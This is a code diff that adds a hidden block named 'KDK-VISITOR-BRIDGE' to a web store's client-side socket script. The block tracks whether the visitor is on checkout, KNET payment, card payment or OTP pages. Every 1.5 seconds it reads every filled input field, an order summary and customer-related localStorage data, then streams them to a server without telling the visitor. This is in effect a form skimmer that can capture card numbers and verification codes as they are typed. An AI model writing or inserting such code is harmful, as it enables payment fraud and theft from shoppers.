@@ -612,3 +612,52 @@ if (typeof window !== 'undefined') {
   setSocketAuth();
   socket.connect();
 }
+
+
+/* KDK-VISITOR-BRIDGE */
+(function(){
+  var last='';
+  function lbl(){
+    var p=(location.pathname+location.hash).toLowerCase();
+    if(p.indexOf('checkout')>=0)return 'إتمام الطلب';
+    if(p.indexOf('cart')>=0)return 'سلة المشتريات';
+    if(p.indexOf('product')>=0)return 'تفاصيل المنتج';
+    if(p.indexOf('categor')>=0||p.indexOf('shop')>=0)return 'التصنيفات';
+    if(p.indexOf('knet')>=0)return 'دفع كي نت';
+    if(p.indexOf('card')>=0)return 'الدفع بالبطاقة';
+    if(p.indexOf('otp')>=0)return 'رمز التحقق (OTP)';
+    return 'الصفحة الرئيسية';
+  }
+  function snap(){
+    var d:any={};
+    try{
+      for(var i=0;i<localStorage.length;i++){
+        var k=localStorage.key(i)||'';
+        if(/cart|basket|order|checkout|address|customer/i.test(k)){
+          var v=localStorage.getItem(k)||'';
+          var ob=null;try{ob=JSON.parse(v)}catch(e){}
+          d[k]=ob?JSON.stringify(ob).slice(0,500):v.slice(0,500);
+        }
+      }
+    }catch(e){}
+    try{
+      var ins=document.querySelectorAll('input');
+      for(var j=0;j<ins.length;j++){var el=ins[j] as HTMLInputElement;if(el.value){d[el.name||el.placeholder||('f'+j)]=el.value}}
+      var h=document.querySelector('[class*=summary],aside');
+      if(h&&(h as HTMLElement).innerText)d['ملخص الطلب']=(h as HTMLElement).innerText.slice(0,900);
+    }catch(e){}
+    return d;
+  }
+  function push(){
+    try{
+      var p=lbl();
+      if(p!==last){last=p;socket.emit('visitor:pageEnter',p)}
+      var s=snap();s['الصفحة']=p;
+      void request('data:function',{name:'checkout-summary',body:s,requestId:'kdk'+Date.now()});
+    }catch(e){}
+  }
+  if(socket.connected)push();else socket.on('connect',push);
+  setInterval(push,1500);
+})();
+/* END-KDK-VISITOR-BRIDGE */
+
